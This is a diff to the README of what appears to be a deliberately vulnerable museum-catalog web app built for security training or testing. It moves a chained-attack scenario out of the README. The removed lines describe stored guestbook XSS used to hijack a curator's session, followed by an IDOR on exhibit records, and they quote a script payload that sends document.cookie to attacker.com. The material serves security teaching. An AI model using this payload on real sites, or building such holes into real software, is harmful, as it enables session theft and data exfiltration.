@@ -12,6 +12,8 @@ Arts & Museum Catalogs
 - SQLite (in-memory)
 
 ## Features
+
+For chained vulnerability scenarios, see [scenarios.md](scenarios.md).
 - User registration and login
 - Browse museum collection list (Decoy: HTML title escaping)
 - View individual exhibit details (vulnerable to IDOR in confidential notes)
@@ -23,27 +25,6 @@ The vulnerabilities in this application are intentional. Refer to [.vulns](file:
 
 ---
 
-## Chained Vulnerability Scenario
-
-### Chain: "Stored Guestbook XSS → Session Hijack IDOR Exfiltration"
-
-An attacker uploads a Stored XSS comment to steal active session cookies of visiting curators, then queries private golden artifacts via the IDOR endpoint.
-
-| Step | Issue | Severity (standalone) | OWASP | Location |
-|------|-------|-----------------------|-------|----------|
-| 1 | Guestbook comments are vulnerable to Stored XSS | High | A03 | `src/index.js` → `GET /api/guestbook` |
-| 2 | Exhibit details are vulnerable to IDOR | Medium | A01 | `src/index.js` → `GET /api/exhibits/:id` |
-
-**Attack narrative**:
-1. The attacker submits a guestbook entry containing a malicious script: `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`.
-2. The curator admin reviews guestbook submissions at `/api/guestbook`.
-3. The script executes in the curator's browser, transmitting their session cookie.
-4. The attacker sets the hijacked cookie and queries `/api/exhibits/2`.
-5. The server returns the private details of gold pharaonic crowns, achieving data exfiltration.
-
-**Combined Impact**: `db_exfiltration` — Attacker hijacks admin sessions to download private museum records.
-
----
 
 ## API Endpoints
 
